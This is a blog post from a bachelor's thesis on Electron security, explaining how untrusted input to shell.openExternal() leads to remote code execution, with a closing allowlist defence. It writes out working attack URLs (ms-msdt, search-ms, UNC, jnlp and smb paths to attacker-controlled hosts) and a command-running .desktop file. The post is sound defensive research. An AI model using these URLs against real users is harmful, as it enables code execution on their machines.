<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><title>The dangers of Electron's shell.openExternal()—many paths to remote code execution</title><link rel=stylesheet href=https://benjamin-altpeter.de/css/main.css><link rel=stylesheet href=https://benjamin-altpeter.de/css/syntax.css><link rel=canonical href=https://benjamin-altpeter.de/shell-openexternal-dangers/><meta name=generator content="Hugo 0.83.1"></head><body><header><div class=container><div id=logo><a href=https://benjamin-altpeter.de/>Benjamin Altpeter</a></div><nav><div id=menu-items><a href=https://benjamin-altpeter.de/>Home</a>
<a href=https://benjamin-altpeter.de/post>Blog</a>
<a href=https://docs.benjamin-altpeter.de>Docs</a>
<a href=https://benjamin-altpeter.de/projects>Projects</a>
<a href=https://benjamin-altpeter.de/contact>Contact</a></div></nav></div></header><div class=container><main><img class=image src=https://benjamin-altpeter.de/img/shell-openexternal-dangers.png alt="The dangers of Electron's shell.openExternal()—many paths to remote code execution"><article class=main-article><h1>The dangers of Electron's shell.openExternal()—many paths to remote code execution</h1><aside class=main-article-meta>Published: <span class=meta-date><time>2020-08-29T17:27</time></span></aside><div id=main-article-content class=content><p>For my bachelor&rsquo;s thesis, I looked into the security of <a href=https://www.electronjs.org/>Electron</a> apps. One possible attack vector that kept coming up was the insecure use of the <code>shell.openExternal()</code> function, which is commonly used to open websites in the user&rsquo;s browser instead of in-app. Both the official <a href=https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content>security recommendations</a> by the Electron developers and Doyensec&rsquo;s <a href=https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf>Electron security checklist</a> explicitly warn not to pass untrusted input to this function, explaining that an attacker might otherwise be able to execute arbitrary commands on the user&rsquo;s computer.<br>But how would the attacker actually do that? Apart from <a href=https://security.stackexchange.com/a/225808>an answer on the Information Security Stack Exchange</a> with some partly outdated details, there didn&rsquo;t seem to be any information available.</p><p>So, I had to dig in myself. I found that <code>shell.openExternal()</code> can <strong>absolutely</strong> be used to execute arbitrary code on all major systems (Windows, macOS and Linux). But the actual attack vectors that are available vary depending on the system. This post will provide an overview of what I found. The attacks presented here are by no means exhaustive—there are definitely others. Just because your app protects against the attacks I list, doesn&rsquo;t mean you are safe. I will include a <a href=#defending-against-these-attacks>section</a> at the end of the post on how to safely use <code>shell.openExternal()</code>.</p><h2 id=what-is-this-all-about>What is this all about?</h2><p>But before we go into the actual attacks, let&rsquo;s take a step back and discuss what the problem is in the first place. Electron includes a function <code>shell.openExternal(url)</code> that will &ldquo;open the given external protocol URL in the desktop&rsquo;s default manner&rdquo; according to the <a href=https://www.electronjs.org/docs/api/shell#shellopenexternalurl-options>documentation</a>. This means that if I call <code>shell.openExternal('https://benjamin-altpeter.de)</code>, my website would open in the user&rsquo;s default browser instead of in my Electron app. Similarly, if I were to call <code>shell.openExternal('mailto:hi@bn.al')</code>, the user&rsquo;s default email program would open, ready to compose an email to me.</p><p>So far, so good. From my experience, this is the only functionality that most apps need. The problem is that <code>shell.openExternal()</code> can do <strong>a lot</strong> more. In fact, it will happily open URLs for any protocol (see <a href=#digging-deeper-into-how-shellopenexternal-actually-opens-urls>this section</a> on why that is).</p><p>The first potentially &lsquo;problematic&rsquo; protocol that comes to mind is the <code>file:</code> protocol and that is actually the one that is usually discussed. What if we were to pass <code>file://c:/windows/system32/calc.exe</code> or <code>file:/System/Applications/Calculator.app</code>? As you might guess, this would indeed open the calculator on Windows or macOS, respectively. However, this isn&rsquo;t too interesting in and of itself. As we can only specify the path to the executable but not pass any arguments, the chance of executing a <a href=https://lolbas-project.github.io>living off the land attack</a> are slim. Thus, the attacker would likely have needed to drop a malicious executable beforehand. Don&rsquo;t get me wrong: This is already a problem but the actual impact is far greater as we will see.</p><h2 id=enter-remote-files>Enter: remote files</h2><p>We don&rsquo;t have to limit ourselves to local files already on the user&rsquo;s computer, though. Operating systems typically also include support for accessing files on remote file servers. Maybe we can use those to more easily execute arbitrary code? Why yes, yes we can! As I hinted at earlier, the particular attacks depend on the operating system in use, so I will go through the major ones.</p><h3 id=windows>Windows</h3><p>Windows most notably supports the <a href=https://en.wikipedia.org/wiki/Server_Message_Block>SMB/CIFS protocol</a>. We can access files on a remote SMB server using URLs of the form <code>\\server\share\path\to\file</code> (which just maps back to a <code>file:</code> URL). For testing, we can conveniently use Microsoft&rsquo;s <a href=https://docs.microsoft.com/en-us/sysinternals/#sysinternals-live>Sysinternals Live</a> service which hosts all kinds of (harmless) programs on a publicly available SMB server.</p><p>So, let&rsquo;s try calling the following:</p><div class=highlight><pre class=chroma><code class=language-js data-lang=js><span class=nx>shell</span><span class=p>.</span><span class=nx>openExternal</span><span class=p>(</span><span class=s1>&#39;\\\\live.sysinternals.com\\tools\\procmon.exe&#39;</span><span class=p>);</span>
</code></pre></div><p>And indeed, this will open the Process Monitor program, even though it was never present on the user&rsquo;s disk. Do note however, that a &ldquo;Security Warning&rdquo; mentioning the full path is displayed before the program is actually executed. Abusing <em>security fatigue</em>, i.e. users being tired of constant security prompts and simply accepting them without further consideration, the attacker could use a specifically crafted host and file name to convince the user to click &ldquo;Run&rdquo; there.</p><p><video controls autoplay loop><source src=https://benjamin-altpeter.de/vid/shell-openexternal-dangers/windows-samba-sysinternals.mp4 type=video/mp4></video></p><h3 id=macos>macOS</h3><p>While macOS also supports SMB (as well as <a href=https://en.wikipedia.org/wiki/Apple_Filing_Protocol>AFP</a> and <a href=https://en.wikipedia.org/wiki/Network_File_System>NFS</a>), trying to open a URL like <code>smb://attacker.tld/public/exploit.app</code> with <code>shell.openExternal()</code> will merely open Finder with the program selected in recent versions (tested with Catalina). If however, the attacker could somehow convince the user to mount the share themselves, the file would now also be available through <code>file:/Volumes/public/exploit.app</code> where it can actually be executed.</p><p>Further, macOS previously had an automount feature that would make any NFS export available via <code>file:/net/attacker.tld/path/to/export</code>. While this feature has been disabled in Catalina, it continues to work on machines that have not been upgraded yet.</p><h3 id=linux>Linux</h3><p>On <strong>Linux</strong>, the situation is more complex. The <code>xdg-open</code> program, which is used internally by <code>shell.openExternal()</code> (see <a href=#digging-deeper-into-how-shellopenexternal-actually-opens-urls>this section</a>), will usually delegate to the desktop environment&rsquo;s own &ldquo;open&rdquo; function, like <code>gio open</code> for Gnome. These functions usually don&rsquo;t handle opening executables and will instead either refuse to open them or display them in some other application like a hex editor, if installed.</p><p>It is however possible to circumvent this limitation in some cases. On Xubuntu 20.04 running the XFCE desktop, <code>.desktop</code> files can be executed using <code>xdg-open</code>. Those files can execute arbitrary commands as this simple example shows:</p><div class=highlight><pre class=chroma><code class=language-ini data-lang=ini><span class=k>[Desktop Entry]</span>
<span class=na>Exec</span><span class=o>=</span><span class=s>xmessage &#34;Hello from Electron.&#34;</span>
<span class=na>Type</span><span class=o>=</span><span class=s>Application</span>
</code></pre></div><p><video controls autoplay loop><source src=https://benjamin-altpeter.de/vid/shell-openexternal-dangers/xubuntu-desktop-file.mp4 type=video/mp4></video></p><p>The handling of remote locations also differs between distributions and desktop environments. While Ubuntu 20.04 with Gnome refuses to open Samba shares that have not been mounted yet, Xubuntu 20.04 will instead gladly open files from there, including <code>.desktop</code> files (albeit sometimes with a warning about an &ldquo;Untrusted application launcher&rdquo;).</p><h2 id=take-your-pick-of-a-protocol>Take your pick of a protocol</h2><p>In addition, even if <code>file:</code> and similar URLs are filtered out, the attacker can make use of the myriad of other URI scheme handlers registered on modern systems. Vulnerabilities in those protocol handlers occur from time to time (in programs like <a href=https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62>Electron</a>, <a href=https://leucosite.com/Microsoft-Edge-RCE/>Microsoft Edge</a>, <a href=https://thewhiteh4t.github.io/2018/11/16/ubisoft-uplay-rce-exploit.html>Ubisoft&rsquo;s Uplay</a>, or <a href=https://zero.lol/2019-05-22-fun-with-uri-handlers/>Origin</a>) and sometimes even the intended behaviour of those handlers can also be abused.</p><p>I will give three examples for Windows here but there are definitely more of them out there and similar vectors likely also exist for other systems.</p><ul><li><p>Windows includes the <code>ms-msdt:</code> protocol that opens the <a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msdt>Microsoft Support Diagnostic Tool</a> which provides the troubleshooting wizard to diagnose Wi-Fi and audio problems and the like. This protocol directly passes the string it is given to the <code>msdt.exe</code> program. The attacker now needs to find an included wizard that allows the execution of arbitrary programs, preferably even remote ones. The program compatibility wizard fits this description. Luckily for the attacker, all user input can also be prefilled from the command line, leading to this URL:</p><div class=highlight><pre class=chroma><code class=language-fallback data-lang=fallback>ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param IT_BrowseForFile=&#34;\\live.sysinternals.com\tools\procmon.exe&#34; /param IT_SelectProgram=&#34;NotListed&#34; /param IT_AutoTroubleshoot=&#34;ts_AUTO&#34;
</code></pre></div><p>Upon opening this URL with <code>shell.openExternal()</code>, the troubleshooting wizard will open and show a progress bar for the &ldquo;diagnosis&rdquo;. Once completed, the user is asked to click a button to check the compatibility settings. When they do so, the Process Monitor tool is once again launched from the remote server. As this vector uses the official Microsoft troubleshooting tool that the user may already be familiar with and signals legitimate diagnosis taking place, it shouldn&rsquo;t be too hard for the attacker to convince the user that clicking this button is necessary.</p><p><video controls autoplay loop><source src=https://benjamin-altpeter.de/vid/shell-openexternal-dangers/windows-msdt.mp4 type=video/mp4></video></p></li><li><p>Windows further includes the <a href=https://docs.microsoft.com/en-us/windows/win32/search/getting-started-with-parameter-value-arguments><code>search-ms:</code> protocol</a> that opens the search feature. The attacker can supply both the query of the search and the location. This location can also be on a remote Samba share. Finally, they can even set the title of the search window.</p><p>Using this, the attacker can craft the following URL searching the Sysinternals Live share to only display the Process Monitor executable with a title suggesting an important update:</p><div class=highlight><pre class=chroma><code class=language-fallback data-lang=fallback>search-ms:query=procmon.exe&amp;crumb=location:%5C%5Clive.sysinternals.com%5Ctools&amp;displayname=Important%20update
</code></pre></div><p><video controls autoplay loop><source src=https://benjamin-altpeter.de/vid/shell-openexternal-dangers/windows-search-ms.mp4 type=video/mp4></video></p></li><li><p>If Java, which is often bundled with LibreOffice for example, is installed on the system, the attacker could also use the <code>jnlp:</code> protocol to launch a remote Java application like this (this does display a warning, though):</p><div class=highlight><pre class=chroma><code class=language-fallback data-lang=fallback>jnlp:https://attacker.tld/program.jnlp
</code></pre></div></li></ul><h2 id=digging-deeper-into-how-shellopenexternal-actually-opens-urls>Digging deeper into how shell.openExternal() actually opens URLs</h2><p>If you want to research this topic further, it is useful to know how URLs are actually opened by <code>shell.openExternal()</code>. Unsurprisingly, this also differs by the operating system:</p><ul><li><p>On Windows, <a href=https://github.com/electron/electron/blob/dcbed18f44a11f239f4d9bddefdb6291dc20d5bb/shell/common/platform_util_win.cc#L339-L348>a separate thread is opened</a> (omitted here for brevity), the URL is surrounded with double quotes and then directly and without any filtering passed into <a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutew><code>ShellExecuteW()</code></a> (Code taken from <a href=https://github.com/electron/electron/blob/dcbed18f44a11f239f4d9bddefdb6291dc20d5bb/shell/common/platform_util_win.cc#L236-254>here</a>):</p><div class=highlight><pre class=chroma><code class=language-cpp data-lang=cpp><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>OpenExternalOnWorkerThread</span><span class=p>(</span><span class=k>const</span> <span class=n>GURL</span><span class=o>&amp;</span> <span class=n>url</span><span class=p>,</span>
    <span class=k>const</span> <span class=n>platform_util</span><span class=o>::</span><span class=n>OpenExternalOptions</span><span class=o>&amp;</span> <span class=n>options</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>// […]
</span><span class=c1></span>  <span class=n>base</span><span class=o>::</span><span class=n>string16</span> <span class=n>escaped_url</span> <span class=o>=</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\&#34;</span><span class=s>&#34;</span>
      <span class=o>+</span> <span class=n>base</span><span class=o>::</span><span class=n>UTF8ToUTF16</span><span class=p>(</span><span class=n>url</span><span class=p>.</span><span class=n>spec</span><span class=p>())</span> <span class=o>+</span> <span class=sa>L</span><span class=s>&#34;</span><span class=se>\&#34;</span><span class=s>&#34;</span><span class=p>;</span>
  <span class=c1>// […]
</span><span class=c1></span>  <span class=n>ShellExecuteW</span><span class=p>(</span><span class=k>nullptr</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;open&#34;</span><span class=p>,</span> <span class=n>escaped_url</span><span class=p>.</span><span class=n>c_str</span><span class=p>(),</span> <span class=k>nullptr</span><span class=p>,</span>
                <span class=n>working_dir</span><span class=p>.</span><span class=n>empty</span><span class=p>()</span> <span class=o>?</span> <span class=k>nullptr</span> <span class=o>:</span> <span class=n>working_dir</span><span class=p>.</span><span class=n>c_str</span><span class=p>(),</span>
                <span class=n>SW_SHOWNORMAL</span><span class=p>))</span> <span class=o>&lt;=</span> <span class=mi>32</span><span class=p>)</span>
  <span class=c1>// […]
</span><span class=c1></span><span class=p>}</span>
</code></pre></div></li><li><p>On macOS, the call is <a href=https://github.com/electron/electron/blob/75fd9a349698dc131f5f3c21fd1cff68f0224467/shell/common/platform_util_mac.mm#L99-L118>put onto an asynchronous dispatch queue</a> (omitted here for brevity), where it is passed directly into <code>NSWorkspace#openURLs()</code> (Code taken from <a href=https://github.com/electron/electron/blob/75fd9a349698dc131f5f3c21fd1cff68f0224467/shell/common/platform_util_mac.mm#L31-L54>here</a>):</p><div class=highlight><pre class=chroma><code class=language-objectivec data-lang=objectivec><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>OpenURL</span><span class=p>(</span><span class=n>NSURL</span><span class=o>*</span> <span class=n>ns_url</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>activate</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>// […]  
</span><span class=c1></span>  <span class=n>NSUInteger</span> <span class=n>launchOptions</span> <span class=o>=</span> <span class=n>NSWorkspaceLaunchDefault</span><span class=p>;</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>activate</span><span class=p>)</span> <span class=n>launchOptions</span> <span class=o>|=</span> <span class=n>NSWorkspaceLaunchWithoutActivation</span><span class=p>;</span>

  <span class=kt>bool</span> <span class=n>opened</span> <span class=o>=</span> <span class=p>[[</span><span class=n>NSWorkspace</span> <span class=n>sharedWorkspace</span><span class=p>]</span> <span class=nl>openURLs</span><span class=p>:</span><span class=l>@[</span> <span class=n>ns_url</span> <span class=l>]</span>
                                <span class=nl>withAppBundleIdentifier</span><span class=p>:</span><span class=nb>nil</span>
                                                <span class=nl>options</span><span class=p>:</span><span class=n>launchOptions</span>
                         <span class=nl>additionalEventParamDescriptor</span><span class=p>:</span><span class=nb>nil</span>
                                      <span class=nl>launchIdentifiers</span><span class=p>:</span><span class=nb>nil</span><span class=p>];</span>
  <span class=c1>// […]
</span><span class=c1></span><span class=p>}</span>
</code></pre></div></li><li><p>On Linux, the URL is passed directly and without any filtering into <code>xdg-open</code> (Code taken from <a href=https://github.com/electron/electron/blob/3e8d77d564f3f18abbd97ae9fd3a4cd417612b45/shell/common/platform_util_linux.cc#L93-L105>here</a>. The <code>XDGOpen()</code> function is a wrapper that ultimately directly calls <code>xdg-open [url]</code>):</p><div class=highlight><pre class=chroma><code class=language-cpp data-lang=cpp><span class=kt>void</span> <span class=nf>OpenExternal</span><span class=p>(</span><span class=k>const</span> <span class=n>GURL</span><span class=o>&amp;</span> <span class=n>url</span><span class=p>,</span> <span class=k>const</span> <span class=n>OpenExternalOptions</span><span class=o>&amp;</span>
    <span class=n>options</span><span class=p>,</span> <span class=n>OpenCallback</span> <span class=n>callback</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>// […]
</span><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=n>url</span><span class=p>.</span><span class=n>SchemeIs</span><span class=p>(</span><span class=s>&#34;mailto&#34;</span><span class=p>))</span> <span class=p>{</span>
      <span class=cm>/* [open in default email software] */</span>
  <span class=p>}</span>
  <span class=k>else</span> <span class=p>{</span>
    <span class=kt>bool</span> <span class=n>success</span> <span class=o>=</span> <span class=n>XDGOpen</span><span class=p>(</span><span class=n>url</span><span class=p>.</span><span class=n>spec</span><span class=p>(),</span> <span class=nb>false</span><span class=p>,</span>
        <span class=n>platform_util</span><span class=o>::</span><span class=n>OpenCallback</span><span class=p>());</span>
    <span class=c1>// […]
</span><span class=c1></span>  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div></li></ul><p>All these cases are essentially the same. They take the provided URL and pass it into the respective operating system&rsquo;s native method for opening arbitrary URLs, without applying any filtering or similar. It is entirely on the app developer to make sure that only the URLs they deem safe can be passed.</p><h2 id=defending-against-these-attacks>Defending against these attacks</h2><p>This post has hopefully shown that blocklisting certain protocols or similar approaches are not sufficient to defend against <code>shell.openExternal()</code> attacks. The only viable solution is a strict allowlist that only permits the protocols (or even particular URLs) that are actually intended to be opened.</p><p>As I have said earlier, most apps really only want to open websites in the browser or maybe compose messages in the user&rsquo;s email program. For these use-cases, only <code>http(s):</code> and <code>mailto:</code> need to be allowlisted:</p><div class=highlight><pre class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=p>{</span> <span class=nx>shell</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;electron&#39;</span><span class=p>);</span>

<span class=kd>function</span> <span class=nx>openInBrowser</span><span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>{</span>
  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>[</span><span class=s1>&#39;https:&#39;</span><span class=p>,</span> <span class=s1>&#39;http:&#39;</span><span class=p>].</span><span class=nx>includes</span><span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>url</span><span class=p>).</span><span class=nx>protocol</span><span class=p>))</span> <span class=k>return</span><span class=p>;</span>

  <span class=nx>shell</span><span class=p>.</span><span class=nx>openExternal</span><span class=p>(</span><span class=nx>url</span><span class=p>);</span>
<span class=p>}</span>

<span class=kd>function</span> <span class=nx>openInEmailSoftware</span><span class=p>(</span><span class=nx>mailto_url</span><span class=p>)</span> <span class=p>{</span>
  <span class=k>if</span> <span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=nx>mailto_url</span><span class=p>).</span><span class=nx>protocol</span> <span class=o>!==</span> <span class=s1>&#39;mailto:&#39;</span><span class=p>)</span> <span class=k>return</span><span class=p>;</span>

  <span class=nx>shell</span><span class=p>.</span><span class=nx>openExternal</span><span class=p>(</span><span class=nx>mailto_url</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div></div></article></main><footer><a href=https://benjamin-altpeter.de/contact#license><img src=https://benjamin-altpeter.de/icons/cc-by-nd.png alt="License information"></a>
<span style=float:right><a href=https://benjamin-altpeter.de/privacy>Privacy policy</a> &#183; <a href=https://benjamin-altpeter.de/contact>Legal notice</a></span></footer></div></body></html>